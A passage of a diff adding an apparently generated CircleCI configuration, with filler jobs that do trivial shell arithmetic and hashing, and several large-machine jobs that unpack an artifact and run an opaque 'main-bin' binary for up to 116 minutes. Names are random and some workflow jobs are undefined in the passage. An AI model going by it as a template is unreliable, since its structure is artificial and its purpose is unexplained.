+          root: /tmp/z3
+          paths:
+            - io.data
+  build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/io.data" "$(wc -c < /tmp/z3/io.data 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/io.data 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  verify_go-live:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: chime
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; printenv | wc -l; true ; } > /tmp/z3/step-20.out
+            echo "<< go-live wrote $(wc -c </tmp/z3/step-20.out) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - step-20.out
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/step-20.out" "$(wc -c < /tmp/z3/step-20.out 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/step-20.out 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  rerun_cook-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: split jump
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<422217;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/z3/S.data
+            echo "<< cook-it wrote $(wc -c </tmp/z3/S.data) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - S.data
+  cook-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/01.log" "$(wc -c < /tmp/z3/01.log 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/01.log 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  orchestrate_PROD_HOOK_6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: romanian pull
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 26887); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/z3/z2
+            echo "<< PROD_HOOK_6 wrote $(wc -c </tmp/z3/z2) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - z2
+  PROD_HOOK_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/z2" "$(wc -c < /tmp/z3/z2 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/z2 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  round2_nov6-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: up top
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=0; for(i=1;i<=100;i++)s+=i^2; print s}'; true ; } > /tmp/z3/task-03.log
+            echo "<< nov6-ship wrote $(wc -c </tmp/z3/task-03.log) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - task-03.log
+  nov6-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/task-03.log" "$(wc -c < /tmp/z3/task-03.log 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/task-03.log 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  ctx_VERIFY_PROD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: whizz
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(y=2000;y<=2024;y++){if(y%4==0&&y%100!=0||y%400==0)c++} print c}'; true ; } > /tmp/z3/phase-5.out
+            echo "<< VERIFY_PROD wrote $(wc -c </tmp/z3/phase-5.out) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - phase-5.out
+  VERIFY_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/phase-5.out" "$(wc -c < /tmp/z3/phase-5.out 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/phase-5.out 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  verify_fix-6706:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: run downwind
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<16;i++)printf "%X", i; print ""}'; true ; } > /tmp/z3/T.data
+            echo "<< fix-6706 wrote $(wc -c </tmp/z3/T.data) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - T.data
+  fix-6706:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/step-20.out" "$(wc -c < /tmp/z3/step-20.out 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/step-20.out 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+
+  db_zed-ship_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: stopper knot
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; printf "%d\n" $((RANDOM * 17 + 42)); true ; } > /tmp/z3/8192.out
+            echo "<< zed-ship wrote $(wc -c </tmp/z3/8192.out) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - 8192.out
+  reset_fix-6717_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: noise reduce
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=27 2>/dev/null | sha256sum; true ; } > /tmp/z3/build-02.log
+            echo "<< fix-6717 wrote $(wc -c </tmp/z3/build-02.log) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - build-02.log
+  validate_PROD_HOOK_6_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: sumo pull
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; seq 1 28591 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/z3/z2
+            echo "<< PROD_HOOK_6 wrote $(wc -c </tmp/z3/z2) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - z2
+  tester_build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: instrumental
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk 'NR>50' | wc -l; true ; } > /tmp/z3/io.data
+            echo "<< build wrote $(wc -c </tmp/z3/io.data) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - io.data
+  warmup_VERIFY_PROD_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: thread fine
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; printenv | wc -l; true ; } > /tmp/z3/phase-5.out
+            echo "<< VERIFY_PROD wrote $(wc -c </tmp/z3/phase-5.out) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - phase-5.out
+  package_all-greens_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: hangry
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; printf 'a\nb\na\nc\n' | sort -u | wc -l; true ; } > /tmp/z3/k.out
+            echo "<< all-greens wrote $(wc -c </tmp/z3/k.out) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - k.out
+  verify_november-2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: burn in
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1 count=20 2>/dev/null | xxd 2>/dev/null | head -1 || dd if=/dev/urandom bs=1 count=20 2>/dev/null | od -tx1 | head -1; true ; } > /tmp/z3/col.csv
+            echo "<< november-2 wrote $(wc -c </tmp/z3/col.csv) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - col.csv
+  Alpha_CHECK_UAT_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: plank forever
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; printf "%d" $$ | md5sum; true ; } > /tmp/z3/stage3.data
+            echo "<< CHECK_UAT wrote $(wc -c </tmp/z3/stage3.data) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - stage3.data
+  tester_deploy_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: sforzando
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && seq 1 50 > "$tf" && md5sum "$tf" | awk '{print $1}' && rm "$tf"; true ; } > /tmp/z3/emit.pkg
+            echo "<< deploy wrote $(wc -c </tmp/z3/emit.pkg) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - emit.pkg
+  package_update-oauth-redirect_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: earworm
+          command: |
+            mkdir -p /tmp/z3
+            set +o pipefail 2>/dev/null; head -c 915456 /dev/urandom > /tmp/z3/attempt-2.data; true
+            echo "<< update-oauth-redirect wrote $(wc -c </tmp/z3/attempt-2.data) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - attempt-2.data
+workflows:
+  test:
+    jobs:
+      - verify_go-live
+      - verify_fix-6706
+      - alpha_update-oauth
+      - go-live:
+          requires:
+            - verify_go-live
+            - verify_fix-6706
+            - alpha_update-oauth
+      - fix-6706:
+          requires:
+            - verify_go-live
+            - verify_fix-6706
+            - alpha_update-oauth
+      - update-oauth:
+          requires:
+            - verify_go-live
+            - verify_fix-6706
+            - alpha_update-oauth
+      - validate-quick-release-candidate:
+          requires:
+            - verify_go-live
+            - verify_fix-6706
+            - alpha_update-oauth
+      - produce-staging-test-matrix:
+          requires:
+            - verify_go-live
+            - verify_fix-6706
+            - alpha_update-oauth
+      - foxtrot:
+          requires:
+            - verify_go-live
+            - verify_fix-6706
+            - alpha_update-oauth
+      - v7-ga3:
+          requires:
+            - verify_go-live
+            - verify_fix-6706
+            - alpha_update-oauth
+      - APP-677:
+          requires:
+            - verify_go-live
+            - verify_fix-6706
+            - alpha_update-oauth
+      - rerun_delta-9
+      - rerun_cook-it
+      - kick_fix-3760
+      - delta-9:
+          requires:
+            - rerun_delta-9
+            - rerun_cook-it
+            - kick_fix-3760
+      - cook-it:
+          requires:
+            - rerun_delta-9
+            - rerun_cook-it
+            - kick_fix-3760
+      - fix-3760:
+          requires:
+            - rerun_delta-9
+            - rerun_cook-it
+            - kick_fix-3760
+      - Package_Staging9:
+          requires:
+            - rerun_delta-9
+            - rerun_cook-it
+            - kick_fix-3760
+      - ruby3-lint:
+          requires:
+            - rerun_delta-9
+            - rerun_cook-it
+            - kick_fix-3760
+      - teh-ci:
+          requires:
+            - rerun_delta-9
+            - rerun_cook-it
+            - kick_fix-3760
+      - ruby3-release:
+          requires:
+            - rerun_delta-9
+            - rerun_cook-it
+            - kick_fix-3760
+      - blast-off:
+          requires:
+            - rerun_delta-9
+            - rerun_cook-it
+            - kick_fix-3760
+      - min-verify:
+          requires:
+            - rerun_delta-9
+            - rerun_cook-it
+            - kick_fix-3760
+      - bootstrap_update-cache
+      - update-cache:
+          requires:
+            - bootstrap_update-cache
+      - env_strated-61:
+          requires:
+            - bootstrap_update-cache
+      - strated-61:
+          requires:
+            - env_strated-61
+      - round2_nov6-ship:
+          requires:
+            - env_strated-61
+      - nov6-ship:
+          requires:
+            - round2_nov6-ship
+      - tap_zed-ship
+      - db_zed-ship_2:
+          requires:
+            - tap_zed-ship
+      - zed-ship:
+          requires:
+            - db_zed-ship_2
+      - bootstrap_fix-6717:
+          requires:
+            - db_zed-ship_2
+      - reset_fix-6717_2:
+          requires:
+            - bootstrap_fix-6717
+      - fix-6717:
+          requires:
+            - reset_fix-6717_2
+      - orchestrate_PROD_HOOK_6:
+          requires:
+            - reset_fix-6717_2
+      - validate_PROD_HOOK_6_2:
+          requires:
+            - orchestrate_PROD_HOOK_6
+      - PROD_HOOK_6:
+          requires:
+            - validate_PROD_HOOK_6_2
+      - orchestrate_build:
+          requires:
+            - validate_PROD_HOOK_6_2
+      - tester_build_2:
+          requires:
+            - orchestrate_build
+      - build:
+          requires:
+            - tester_build_2
+      - ctx_VERIFY_PROD:
+          requires:
+            - tester_build_2
+      - warmup_VERIFY_PROD_2:
+          requires:
+            - ctx_VERIFY_PROD
+      - VERIFY_PROD:
+          requires:
+            - warmup_VERIFY_PROD_2
+      - bootstrap_all-greens:
+          requires:
+            - warmup_VERIFY_PROD_2
+      - package_all-greens_2:
+          requires:
+            - bootstrap_all-greens
+      - all-greens:
+          requires:
+            - package_all-greens_2
+      - canary_november-2:
+          requires:
+            - package_all-greens_2
+      - verify_november-2_2:
+          requires:
+            - canary_november-2
+      - november-2:
+          requires:
+            - verify_november-2_2
+      - canary_CHECK_UAT:
+          requires:
+            - verify_november-2_2
+      - Alpha_CHECK_UAT_2:
+          requires:
+            - canary_CHECK_UAT
+      - CHECK_UAT:
+          requires:
+            - Alpha_CHECK_UAT_2
+      - produce_deploy:
+          requires:
+            - Alpha_CHECK_UAT_2
+      - tester_deploy_2:
+          requires:
+            - produce_deploy
+      - deploy:
+          requires:
+            - tester_deploy_2
+      - canary1_update-oauth-redirect:
+          requires:
+            - tester_deploy_2
+      - package_update-oauth-redirect_2:
+          requires:
+            - canary1_update-oauth-redirect
+      - update-oauth-redirect:
+          requires:
+            - package_update-oauth-redirect_2
